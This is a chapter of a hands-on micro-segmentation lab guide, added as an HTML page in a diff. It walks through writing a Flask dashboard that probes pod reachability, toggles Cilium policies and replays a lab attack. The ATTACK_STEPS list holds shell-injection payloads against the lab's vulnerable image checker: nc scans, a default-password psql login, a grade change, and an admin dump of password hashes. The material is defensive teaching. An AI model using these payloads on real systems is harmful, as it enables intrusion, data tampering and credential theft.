@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#ffffff">
+<meta name="color-scheme" content="light">
+<title>Chapter 7. Build your dashboard | Micro-segmentation lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;700&family=Noto+Sans+Mono:wght@400&display=swap">
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="alternate" hreflang="ar" href="../ar/guide/ch07.html">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400&text=%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9&display=swap">
+</head>
+<body class="">
+<a class="skip" href="#main">Skip to content</a>
+<header class="top"><div class="top-in">
+<a class="brand" href="../index.html">Micro-segmentation lab</a>
+<nav aria-label="Micro-segmentation lab"><ul>
+<li><a href="../index.html">Quick path</a></li>
+<li><a href="../guide/index.html" aria-current="page">Full guide</a></li>
+<li><a href="../downloads.html">Downloads</a></li>
+<li><a href="../ar/guide/ch07.html" lang="ar" hreflang="ar" data-setlang="ar">العربية</a></li>
+</ul></nav>
+</div></header>
+<div class="layout"><details class="rail" open><summary>Chapters</summary><nav aria-label="Chapters"><ol class="toc"><li><a href="ch00.html">0. How to use this guide</a></li><li><a href="ch01.html">1. What you will build</a></li><li><a href="ch02.html">2. Before you start</a></li><li><a href="ch03.html">3. Set up the environment</a></li><li><a href="ch04.html">4. Create the cluster</a></li><li><a href="ch05.html">5. Write the services</a></li><li><a href="ch06.html">6. Deploy the portal</a></li><li><a href="ch07.html" aria-current="page">7. Build your dashboard</a><ol class="sub"><li><a href="#step-1-write-dashboardapppy">Step 1. Write dashboard/app.py</a></li><li><a href="#step-2-check-that-apppy-compiles">Step 2. Check that app.py compiles</a></li><li><a href="#step-3-start-the-dashboard">Step 3. Start the dashboard</a></li><li><a href="#step-4-test-the-status-route">Step 4. Test the status route</a></li><li><a href="#step-5-run-one-probe-by-hand">Step 5. Run one probe by hand</a></li><li><a href="#step-6-test-the-matrix-route">Step 6. Test the matrix route</a></li><li><a href="#step-7-test-the-policy-and-drops-routes">Step 7. Test the policy and drops routes</a></li><li><a href="#step-8-write-dashboardindexhtml">Step 8. Write dashboard/index.html</a></li><li><a href="#step-9-open-the-dashboard">Step 9. Open the dashboard</a></li><li><a href="#checkpoint">Checkpoint</a></li></ol></li><li><a href="ch08.html">8. Attack the flat network</a></li><li><a href="ch09.html">9. Design the policy</a></li><li><a href="ch10.html">10. Apply micro-segmentation</a></li><li><a href="ch11.html">11. Read the evidence in Hubble</a></li><li><a href="ch12.html">12. Measure</a></li><li><a href="ch13.html">13. Getting unstuck alone</a></li><li><a href="ch14.html">14. Evidence for your report</a></li><li><a href="ch15.html">15. Day-by-day plan</a></li><li><a href="appendix.html">Appendices</a></li></ol></nav></details><main id="main" class="content chapter"><h1 id="chapter-7-build-your-dashboard">Chapter 7. Build your dashboard</h1>
+<p>By the end of this chapter you have a control panel for the rest of the project, a web page at <code class="nw">http://localhost:5050</code> that runs in WSL. It shows whether the policies are on, which of the 36 paths between your services are open, how far the attack gets and what Hubble dropped. On the flat network you have now, it must report 36 of 36 paths reachable. Plan on four to six hours in two sittings. In the first you write the back end, <code class="nw">dashboard/app.py</code>, and test each of its routes from the terminal. In the second you write the page, <code class="nw">dashboard/index.html</code>, and open it in the browser.</p>
+<p>The dashboard has two halves. The back end is a Python program that does the work, running <code class="nw">kubectl</code> and <code class="nw">hubble</code> and sending requests to the portal. The page is what you look at, and it asks the back end for data. They talk in JSON, a text format for data made of lists and name-value pairs, which looks much like a Python list or dictionary. Each address the back end answers on, such as <code class="nw">/api/matrix</code>, is called a route, and each route is one Python function.</p>
+<h2 id="step-1-write-dashboardapppy">Step 1. Write dashboard/app.py</h2>
+<p>The back end holds every command the dashboard runs. Writing it first lets you test each piece from the terminal before any web page is involved, so when something fails you know which side to look at.</p>
+<p>In the Ubuntu terminal, make the folder and open a new file in VS Code.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>mkdir -p ~/microseg/dashboard
+code ~/microseg/dashboard/app.py</code></pre></figure>
+<p><code class="nw">mkdir -p</code> creates the <code class="nw">dashboard</code> folder inside your project, and <code class="nw">code</code> opens the new file in VS Code.</p>
+<p><strong>You should see</strong> VS Code open an empty tab named <code class="nw">app.py</code>, and no output in the terminal. Paste the file below, save it with Ctrl+S and check for <code class="nw">LF</code> in the status bar.</p>
+<figure class="code file"><figcaption><span class="lbl">File: dashboard/app.py</span><button type="button" class="copy" aria-label="Copy this file">Copy</button></figcaption><pre dir="ltr"><code># Dashboard for the micro-segmentation lab. Run in WSL:  python app.py
+# Then open http://localhost:5050 in the Windows browser.
+import os
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+
+import requests
+from flask import Flask, jsonify, send_file
+
+app = Flask(__name__)
+
+PORTAL = &quot;http://127.0.0.1:30080&quot;      # the NodePort, the same door the attacker uses
+POLICY_DIR = os.path.expanduser(&quot;~/microseg/k8s/policies&quot;)
+SOURCES = [&quot;frontend&quot;, &quot;news&quot;, &quot;api&quot;, &quot;auth&quot;, &quot;db&quot;, &quot;admin&quot;, &quot;ops&quot;]
+TARGETS = [(&quot;frontend&quot;, 80), (&quot;news&quot;, 5000), (&quot;api&quot;, 8080), (&quot;auth&quot;, 5001), (&quot;db&quot;, 5432), (&quot;admin&quot;, 5002)]
+
+PSQL = &quot;PGCONNECT_TIMEOUT=3 PGPASSWORD=postgres psql -h db -U postgres -d campus&quot;
+SCAN = &quot;nc -zv -w 2 frontend 80; nc -zv -w 2 api 8080; nc -zv -w 2 auth 5001; nc -zv -w 2 db 5432; nc -zv -w 2 admin 5002&quot;
+
+# (step name, text sent in the &quot;url&quot; field, text in the answer that proves the step worked)
+ATTACK_STEPS = [
+    (&quot;1. T1190 exploit the image checker&quot;, &quot;x; id; hostname&quot;, &quot;uid=&quot;),
+    (&quot;2. T1046 discover and scan services&quot;, &quot;x; env | grep SERVICE_PORT= | sort; &quot; + SCAN, &quot;succeeded&quot;),
+    (&quot;3. T1078.001 log in to db with the default account&quot;,
+     &quot;x; &quot; + PSQL + &quot; -c &#x27;SELECT id, username, full_name FROM students&#x27;&quot;, &quot;(4 rows)&quot;),
+    (&quot;4. T1565.001 change Omar&#x27;s grade&quot;,
+     &quot;x; &quot; + PSQL + &quot; -c &#x27;UPDATE grades SET grade = 95 WHERE id = 3&#x27; -c &#x27;SELECT * FROM grades WHERE id = 3&#x27;&quot;,
+     &quot;UPDATE 1&quot;),
+    (&quot;5. reach the admin panel and dump users&quot;, &quot;x; curl -sS --max-time 3 http://admin:5002/users&quot;, &quot;password_hash&quot;),
+]
+
+
+def run(command):
+    &quot;&quot;&quot;Run a command given as a list of words. Return everything it printed.&quot;&quot;&quot;
+    result = subprocess.run(command, capture_output=True, text=True, timeout=120)
+    return result.stdout + result.stderr
+
+
+def probe_from(source):
+    &quot;&quot;&quot;Inside the source pod, try a TCP connect to every other service (all at once, 2 s limit).&quot;&quot;&quot;
+    lines = []
+    for name, port in TARGETS:
+        if name != source:
+            lines.append(f&quot;(timeout 2 bash -c &#x27;echo &gt; /dev/tcp/{name}/{port}&#x27; 2&gt;/dev/null; echo {name}=$?) &amp;&quot;)
+    lines.append(&quot;wait&quot;)
+    output = run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;exec&quot;, &quot;deploy/&quot; + source, &quot;--&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;\n&quot;.join(lines)])
+    row = {}
+    for line in output.splitlines():
+        if &quot;=&quot; in line:
+            name, code = line.strip().split(&quot;=&quot;, 1)
+            if code == &quot;0&quot;:
+                row[name] = &quot;open&quot;        # connected
+            elif code == &quot;124&quot;:
+                row[name] = &quot;blocked&quot;     # no answer in 2 s, Cilium dropped it
+            else:
+                row[name] = &quot;refused&quot;     # fast &quot;no&quot;: nothing listening, or DNS error
+    return row
+
+
+@app.get(&quot;/&quot;)
+def index():
+    return send_file(&quot;index.html&quot;)
+
+
+@app.get(&quot;/api/status&quot;)
+def status():
+    policies = []
+    for word in run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;get&quot;, &quot;ciliumnetworkpolicies&quot;, &quot;-o&quot;, &quot;name&quot;]).split():
+        if word.startswith(&quot;ciliumnetworkpolicy&quot;):
+            policies.append(word.split(&quot;/&quot;)[1])
+    pods = run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;get&quot;, &quot;pods&quot;, &quot;-o&quot;, &quot;wide&quot;])
+    return jsonify({&quot;policies&quot;: policies, &quot;pods&quot;: pods})
+
+
+@app.post(&quot;/api/policies/&lt;action&gt;&quot;)
+def policies(action):
+    if action == &quot;apply&quot;:
+        output = run([&quot;kubectl&quot;, &quot;apply&quot;, &quot;-f&quot;, POLICY_DIR])
+    else:
+        output = run([&quot;kubectl&quot;, &quot;delete&quot;, &quot;-f&quot;, POLICY_DIR, &quot;--ignore-not-found&quot;])
+    return jsonify({&quot;output&quot;: output})
+
+
+@app.get(&quot;/api/matrix&quot;)
+def matrix():
+    # Probe all 7 sources at the same time: about 3 s instead of about 20 s.
+    with ThreadPoolExecutor(max_workers=len(SOURCES)) as pool:
+        rows = list(pool.map(probe_from, SOURCES))
+    result = {}
+    open_paths = 0
+    total_paths = 0
+    for source, row in zip(SOURCES, rows):
+        result[source] = row
+        total_paths += len(row)
+        open_paths += list(row.values()).count(&quot;open&quot;)
+    target_names = [name for name, port in TARGETS]
+    return jsonify({&quot;sources&quot;: SOURCES, &quot;targets&quot;: target_names, &quot;matrix&quot;: result,
+                    &quot;open&quot;: open_paths, &quot;total&quot;: total_paths})
+
+
+@app.post(&quot;/api/attack&quot;)
+def attack():
+    results = []
+    for name, payload, proof in ATTACK_STEPS:
+        try:
+            answer = requests.post(PORTAL + &quot;/news/check-image&quot;, data={&quot;url&quot;: payload}, timeout=60)
+            output = answer.text
+        except requests.RequestException as error:
+            output = &quot;request failed: &quot; + str(error)
+        results.append({&quot;step&quot;: name, &quot;success&quot;: proof in output, &quot;output&quot;: output})
+    return jsonify(results)
+
+
+@app.get(&quot;/api/drops&quot;)
+def drops():
+    output = run([&quot;hubble&quot;, &quot;observe&quot;, &quot;--namespace&quot;, &quot;campus&quot;, &quot;--verdict&quot;, &quot;DROPPED&quot;, &quot;--last&quot;, &quot;20&quot;])
+    return jsonify({&quot;output&quot;: output})
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;127.0.0.1&quot;, port=5050, threaded=True)</code></pre></figure>
+<p>Ignore the <code class="nw">python app.py</code> in the file's first comment. Step 3 gives the command that works.</p>
+<h3 id="settings-the-top-of-the-file">Settings: the top of the file</h3>
+<p>The imports bring in the tools the file uses. <code class="nw">subprocess</code> starts other programs, such as <code class="nw">kubectl</code>, and reads what they print. <code class="nw">ThreadPoolExecutor</code> runs several jobs at the same time. <code class="nw">requests</code> sends HTTP requests, and from Flask come <code class="nw">jsonify</code>, which turns a Python dictionary or list into a JSON answer, and <code class="nw">send_file</code>, which answers with a file from disk.</p>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>PORTAL = &quot;http://127.0.0.1:30080&quot;      # the NodePort, the same door the attacker uses
+POLICY_DIR = os.path.expanduser(&quot;~/microseg/k8s/policies&quot;)
+SOURCES = [&quot;frontend&quot;, &quot;news&quot;, &quot;api&quot;, &quot;auth&quot;, &quot;db&quot;, &quot;admin&quot;, &quot;ops&quot;]
+TARGETS = [(&quot;frontend&quot;, 80), (&quot;news&quot;, 5000), (&quot;api&quot;, 8080), (&quot;auth&quot;, 5001), (&quot;db&quot;, 5432), (&quot;admin&quot;, 5002)]</code></pre></figure>
+<p>(1) <code class="nw">PORTAL</code> is the frontend's NodePort. The attack button sends its requests here, so they enter the portal the same way the attacker's requests from Windows do.</p>
+<p>(2) <code class="nw">POLICY_DIR</code> is the folder your policy files go into in <a href="ch10.html">chapter 10</a>. <code class="nw">os.path.expanduser</code> turns the <code class="nw">~</code> into your real home folder, because Python doesn't do that by itself.</p>
+<p>(3) <code class="nw">SOURCES</code> lists the seven pods a probe starts from, and <code class="nw">TARGETS</code> lists the six Services with their ports. Ops is a source but not a target, since it has no Service.</p>
+<p>The <code class="nw">ATTACK_STEPS</code> list below the settings holds the five steps of <a href="ch08.html">chapter 8</a>. Each entry has three parts: a name, the text sent in the <code class="nw">url</code> field of the image checker, and a piece of text that only shows up in the answer when the step worked. <a href="ch08.html">Chapter 8</a> explains each payload.</p>
+<h3 id="running-a-command-run">Running a command: run()</h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>def run(command):
+    &quot;&quot;&quot;Run a command given as a list of words. Return everything it printed.&quot;&quot;&quot;
+    result = subprocess.run(command, capture_output=True, text=True, timeout=120)
+    return result.stdout + result.stderr</code></pre></figure>
+<p><code class="nw">run</code> starts a program and returns everything it printed. The command arrives as a list of separate words, such as <code>["kubectl", "-n", "campus", "get", "pods"]</code>, and <code class="nw">subprocess.run</code> hands those words straight to the program without a shell in between. That's the opposite of the bug in <code class="nw">apps/news.py</code>, which glues text into a command line and hands it to a shell, <code class="nw">;</code> included. Here a <code class="nw">;</code> in an argument would reach kubectl as an ordinary character. <code class="nw">capture_output=True</code> collects what the program prints instead of letting it go to the terminal, <code class="nw">text=True</code> returns it as text, and <code class="nw">timeout=120</code> gives up after two minutes so a stuck command can't freeze the dashboard. The last line joins normal output and error output, so you see error messages in the page too.</p>
+<h3 id="probing-from-inside-a-pod-probe_from">Probing from inside a pod: probe_from()</h3>
+<p>The reachability matrix is built from this function. For one source pod, it tries to open a TCP connection to every other Service at the same time and reports which ones worked.</p>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>def probe_from(source):
+    &quot;&quot;&quot;Inside the source pod, try a TCP connect to every other service (all at once, 2 s limit).&quot;&quot;&quot;
+    lines = []
+    for name, port in TARGETS:
+        if name != source:
+            lines.append(f&quot;(timeout 2 bash -c &#x27;echo &gt; /dev/tcp/{name}/{port}&#x27; 2&gt;/dev/null; echo {name}=$?) &amp;&quot;)
+    lines.append(&quot;wait&quot;)
+    output = run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;exec&quot;, &quot;deploy/&quot; + source, &quot;--&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;\n&quot;.join(lines)])
+    row = {}
+    for line in output.splitlines():
+        if &quot;=&quot; in line:
+            name, code = line.strip().split(&quot;=&quot;, 1)
+            if code == &quot;0&quot;:
+                row[name] = &quot;open&quot;        # connected
+            elif code == &quot;124&quot;:
+                row[name] = &quot;blocked&quot;     # no answer in 2 s, Cilium dropped it
+            else:
+                row[name] = &quot;refused&quot;     # fast &quot;no&quot;: nothing listening, or DNS error
+    return row</code></pre></figure>
+<p>(1) The loop builds one line of bash per target and skips the source itself. For source <code class="nw">news</code> and target <code class="nw">db</code>, the line it builds reads <code>(timeout 2 bash -c 'echo &gt; /dev/tcp/db/5432' 2&gt;/dev/null; echo db=$?) &amp;</code>.</p>
+<p>(2) <code class="nw">/dev/tcp/db/5432</code> isn't a real file. When bash sees a redirect to a path of that shape, it opens a TCP connection to host <code class="nw">db</code> on port 5432 instead. <code class="nw">echo &gt;</code> writes an empty line into that connection, so the command succeeds only if the connection opened.</p>
+<p>(3) <code class="nw">timeout 2</code> stops the attempt after 2 seconds. When it has to stop it, it exits with code 124. An exit code is the number a program leaves behind when it ends, 0 for success and anything else for some kind of failure, and bash keeps the last one in <code class="nw">$?</code>. <code class="nw">echo db=$?</code> prints the target's name and that code. <code class="nw">2&gt;/dev/null</code> hides bash's own error messages, since the code says all the dashboard needs.</p>
+<p>(4) The parentheses group the attempt and the <code class="nw">echo</code> into one unit, and <code class="nw">&amp;</code> at the end runs that unit in the background. All five or six attempts therefore run at once, and the <code class="nw">wait</code> line at the end holds until every one has finished.</p>
+<p>(5) <code class="nw">"\n".join(lines)</code> glues the lines into one small script, and <code>kubectl -n campus exec deploy/&lt;source&gt; -- bash -c</code> runs that script inside a pod of the source Deployment.</p>
+<p>(6) The second half reads the answer line by line. Code <code class="nw">0</code> means the connection opened, so the cell is <code class="nw">open</code>. Code <code class="nw">124</code> means nothing answered within 2 seconds. That's what a Cilium drop looks like from the sender's side, because a dropped packet gets no reply at all, and the cell is <code class="nw">blocked</code>. Any other code means a fast "no", such as a Service with no ready pod behind it, and the cell is <code class="nw">refused</code>.</p>
+<h3 id="routes-and-apistatus">Routes / and /api/status</h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>@app.get(&quot;/&quot;)
+def index():
+    return send_file(&quot;index.html&quot;)
+
+
+@app.get(&quot;/api/status&quot;)
+def status():
+    policies = []
+    for word in run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;get&quot;, &quot;ciliumnetworkpolicies&quot;, &quot;-o&quot;, &quot;name&quot;]).split():
+        if word.startswith(&quot;ciliumnetworkpolicy&quot;):
+            policies.append(word.split(&quot;/&quot;)[1])
+    pods = run([&quot;kubectl&quot;, &quot;-n&quot;, &quot;campus&quot;, &quot;get&quot;, &quot;pods&quot;, &quot;-o&quot;, &quot;wide&quot;])
+    return jsonify({&quot;policies&quot;: policies, &quot;pods&quot;: pods})</code></pre></figure>
+<p><code class="nw">@app.get("/")</code> is how Flask connects a route to a function: a GET request for <code class="nw">/</code> runs <code class="nw">index</code>, which answers with <code class="nw">index.html</code>. GET is the kind of HTTP request that only reads, while POST is the kind that sends something or changes something.</p>
+<p><code class="nw">/api/status</code> runs two kubectl commands. The first lists the policies in <code class="nw">campus</code> by name, in the form <code>ciliumnetworkpolicy.cilium.io/default-deny</code>, and the loop keeps the part after the <code class="nw">/</code>. The second fetches the same pod table you printed in <a href="ch06.html">chapter 6</a>. The answer is a JSON object with two fields, <code class="nw">policies</code> and <code class="nw">pods</code>.</p>
+<h3 id="route-apipolicies">Route /api/policies/<action></h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>@app.post(&quot;/api/policies/&lt;action&gt;&quot;)
+def policies(action):
+    if action == &quot;apply&quot;:
+        output = run([&quot;kubectl&quot;, &quot;apply&quot;, &quot;-f&quot;, POLICY_DIR])
+    else:
+        output = run([&quot;kubectl&quot;, &quot;delete&quot;, &quot;-f&quot;, POLICY_DIR, &quot;--ignore-not-found&quot;])
+    return jsonify({&quot;output&quot;: output})</code></pre></figure>
+<p><code class="nw">&lt;action&gt;</code> in the route is a variable part of the path. A POST to <code class="nw">/api/policies/apply</code> runs the function with <code class="nw">action</code> set to <code class="nw">"apply"</code>, which applies every file in the policy folder at once. Any other word, such as <code class="nw">remove</code>, deletes the objects those files describe, and <code class="nw">--ignore-not-found</code> keeps it quiet about policies that aren't there. These routes use POST because they change the cluster. The answer carries whatever kubectl printed.</p>
+<h3 id="route-apimatrix">Route /api/matrix</h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>@app.get(&quot;/api/matrix&quot;)
+def matrix():
+    # Probe all 7 sources at the same time: about 3 s instead of about 20 s.
+    with ThreadPoolExecutor(max_workers=len(SOURCES)) as pool:
+        rows = list(pool.map(probe_from, SOURCES))
+    result = {}
+    open_paths = 0
+    total_paths = 0
+    for source, row in zip(SOURCES, rows):
+        result[source] = row
+        total_paths += len(row)
+        open_paths += list(row.values()).count(&quot;open&quot;)
+    target_names = [name for name, port in TARGETS]
+    return jsonify({&quot;sources&quot;: SOURCES, &quot;targets&quot;: target_names, &quot;matrix&quot;: result,
+                    &quot;open&quot;: open_paths, &quot;total&quot;: total_paths})</code></pre></figure>
+<p>A thread is a separate line of work inside one program. <code class="nw">ThreadPoolExecutor</code> with seven workers and <code class="nw">pool.map(probe_from, SOURCES)</code> probe all seven sources in parallel, so the whole matrix takes about as long as the slowest pod instead of the sum of all seven. In the test run it took about 1.2 seconds. The loop then counts. <code class="nw">total_paths</code> adds up how many targets each source tried, which is 36 when all seven pods answered, and <code class="nw">open_paths</code> counts the cells that came back <code class="nw">open</code>.</p>
+<h3 id="route-apiattack">Route /api/attack</h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>@app.post(&quot;/api/attack&quot;)
+def attack():
+    results = []
+    for name, payload, proof in ATTACK_STEPS:
+        try:
+            answer = requests.post(PORTAL + &quot;/news/check-image&quot;, data={&quot;url&quot;: payload}, timeout=60)
+            output = answer.text
+        except requests.RequestException as error:
+            output = &quot;request failed: &quot; + str(error)
+        results.append({&quot;step&quot;: name, &quot;success&quot;: proof in output, &quot;output&quot;: output})
+    return jsonify(results)</code></pre></figure>
+<p>For each of the five steps, <code class="nw">requests.post</code> sends the payload to <code class="nw">/news/check-image</code> through the NodePort as a form field named <code class="nw">url</code>, the same request the image checker form and the PowerShell commands of <a href="ch08.html">chapter 8</a> send. <code class="nw">timeout=60</code> allows a slow step up to a minute. A step counts as a success when its proof text appears in the answer, for example <code class="nw">UPDATE 1</code> when the grade was changed. If the request itself fails, the error goes into the output and the step counts as failed.</p>
+<h3 id="route-apidrops-and-the-start">Route /api/drops and the start</h3>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/app.py</span></figcaption><pre dir="ltr"><code>@app.get(&quot;/api/drops&quot;)
+def drops():
+    output = run([&quot;hubble&quot;, &quot;observe&quot;, &quot;--namespace&quot;, &quot;campus&quot;, &quot;--verdict&quot;, &quot;DROPPED&quot;, &quot;--last&quot;, &quot;20&quot;])
+    return jsonify({&quot;output&quot;: output})
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;127.0.0.1&quot;, port=5050, threaded=True)</code></pre></figure>
+<p><code class="nw">/api/drops</code> asks Hubble for the last 20 flows in <code class="nw">campus</code> that were dropped. <code class="nw">--verdict DROPPED</code> keeps only blocked flows and <code class="nw">--last 20</code> keeps the newest 20. The <code class="nw">hubble</code> tool reaches Hubble Relay, the part of Cilium that collects flows from every node, through the tunnel you opened in <a href="ch04.html">chapter 4</a> with <code class="nw">cilium hubble port-forward</code>. That tunnel has to be running whenever you use the drops panel, and step 7 checks it.</p>
+<p>The last two lines start the web server on port 5050. <code class="nw">host="127.0.0.1"</code> makes it listen only on your own machine, so nobody else on your Wi-Fi can reach it. That's deliberate. This page can delete your policies and has no login, which is the same mistake as the admin panel, and only your own laptop should be able to use it. <code class="nw">threaded=True</code> makes the server answer several requests at once, so the page stays responsive while the matrix is being probed.</p>
+<h2 id="step-2-check-that-apppy-compiles">Step 2. Check that app.py compiles</h2>
+<p>A bad indent or a lost quote stops the whole file from loading. Compiling it now finds that kind of mistake in one second, before you're reading Python's error report in the dashboard's terminal.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>~/microseg/.venv/bin/python -m py_compile ~/microseg/dashboard/app.py &amp;&amp; echo &quot;app.py compiles&quot;</code></pre></figure>
+<p><code class="nw">~/microseg/.venv/bin/python</code> is the Python inside the virtual environment you made in <a href="ch03.html">chapter 3</a>. A virtual environment is a private copy of Python with its own packages, and this one has Flask and requests. <code class="nw">-m py_compile</code> reads the file and turns it into Python's internal form without running it. <code class="nw">&amp;&amp;</code> runs the <code class="nw">echo</code> only if the compile succeeded.</p>
+<p><strong>You should see</strong> one line.</p>
+<p>The line must read <code class="nw">app.py compiles</code>. Python also creates a folder called <code class="nw">__pycache__</code> next to the file. Git ignores it.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<figure class="code out bad"><figcaption><span class="lbl">Output when something is wrong</span></figcaption><pre dir="ltr"><code>Sorry: IndentationError: unexpected indent (/home/&lt;user&gt;/microseg/dashboard/app.py, line 12)</code></pre></figure>
+<p>A line is indented further than the lines around it. Your Linux user name appears in place of <code class="nw">&lt;user&gt;</code>, and the prompt follows on the same line because the message has no line break at its end. The file and the line number are in the brackets at the end of the line. Compare that line's indentation with the file in this guide, and remember that Python counts spaces, so a line that looks right can still be one space off.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>SyntaxError: unterminated f-string literal (detected at line 44)</code></pre></figure>
+<p>One of the two double quotes of the long <code class="nw">lines.append</code> line in <code class="nw">probe_from</code> went missing during the paste. Copy that line again from the guide.</p>
+<h2 id="step-3-start-the-dashboard">Step 3. Start the dashboard</h2>
+<p>The dashboard is a program that keeps running until you stop it. Start it in the terminal you have open now. That terminal then belongs to the dashboard, and you'll open a second one for everything else.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>cd ~/microseg/dashboard &amp;&amp; ../.venv/bin/python app.py</code></pre></figure>
+<p><code class="nw">cd ~/microseg/dashboard</code> moves into the dashboard folder. <code class="nw">..</code> means the folder one level up, so <code class="nw">../.venv/bin/python</code> is the same virtual environment Python as in step 2, and <code class="nw">app.py</code> is the file it runs. Always start the dashboard with this exact command.</p>
+<p><strong>You should see</strong> a few lines from Flask, and then no prompt.</p>
+<p>The line to look for is <code>Running on http://127.0.0.1:5050</code>. The <code class="nw">WARNING</code> line says Flask's built-in server isn't meant for a public website. For a page that only your own laptop can reach, it's fine. The prompt doesn't come back because the server is waiting for requests, and each request you send from now on prints one line here with the request and its status code, usually <code class="nw">200</code>.</p>
+<p>Leave this terminal open. Open a second Ubuntu terminal the same way you opened the first, and run every command for the rest of this chapter there. To stop the dashboard later, click into its terminal and press Ctrl+C. After every restart of Windows or Ubuntu, and after every change to <code class="nw">app.py</code>, start it again with the same command.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<figure class="code out bad"><figcaption><span class="lbl">Output when something is wrong</span></figcaption><pre dir="ltr"><code>ModuleNotFoundError: No module named &#x27;flask&#x27;</code></pre></figure>
+<p>You started the file with the system's <code class="nw">python3</code>, which doesn't have Flask. Ubuntu protects its own Python from extra packages, which is why <a href="ch03.html">chapter 3</a> put Flask into the virtual environment. Start the dashboard with the exact command above.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>Address already in use
+Port 5050 is in use by another program. Either identify and stop that program, or start the server with a different port.</code></pre></figure>
+<p>The dashboard is already running, probably in a terminal you forgot about. Find that terminal and press Ctrl+C there, or stop every copy with <code class="nw">pkill -f "python app.py"</code>, and start it again.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>Command &#x27;python&#x27; not found, did you mean:</code></pre></figure>
+<p>You typed <code class="nw">python app.py</code>, the command in the file's first comment. Ubuntu has no command called <code class="nw">python</code>. Use the command above, which names the virtual environment's Python by its path.</p>
+<h2 id="step-4-test-the-status-route">Step 4. Test the status route</h2>
+<p>Each route gets tested on its own before the page uses it. <code class="nw">curl</code> fetches the route, and jq makes the answer readable. jq is a command-line tool for JSON, which you installed in <a href="ch03.html">chapter 3</a>. Given only <code class="nw">.</code>, it prints JSON neatly indented, and given a filter, it picks out the part you ask for.</p>
+<p>Run these in your second terminal.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s localhost:5050/api/status | jq &#x27;{policies: .policies}&#x27;</code></pre></figure>
+<p><code>curl -s localhost:5050/api/status</code> sends a GET request to the status route, and <code class="nw">-s</code> hides curl's progress bar. <code class="nw">jq '{policies: .policies}'</code> keeps only the <code class="nw">policies</code> field, because the pod table in the other field is long.</p>
+<p><strong>You should see</strong> an object with an empty list.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>{
+  &quot;policies&quot;: []
+}</code></pre></figure>
+<p><code class="nw">"policies": []</code> means no policy objects, which matches the flat network and the <code class="nw">No resources found</code> you saw in <a href="ch06.html">chapter 6</a>.</p>
+<p>Now the other field.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s localhost:5050/api/status | jq -r .pods</code></pre></figure>
+<p><code class="nw">.pods</code> picks the <code class="nw">pods</code> field, and <code class="nw">-r</code> prints it as plain text instead of a quoted JSON string, so the line breaks show as line breaks.</p>
+<p>You should see the pod table from <a href="ch06.html">chapter 6</a>, printed by kubectl inside the dashboard.</p>
+<p>All seven pods must be <code class="nw">1/1 Running</code>, frontend and news on kind-worker. This proves the dashboard can run kubectl and reach your cluster.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<p>Nothing at all, and the prompt comes back. With <code class="nw">-s</code>, curl stays silent even when it can't connect, so an empty answer means the dashboard isn't running. Look at your first terminal. If its prompt is back, start the dashboard again as in step 3.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>jq: parse error: Invalid numeric literal at line 1, column 10</code></pre></figure>
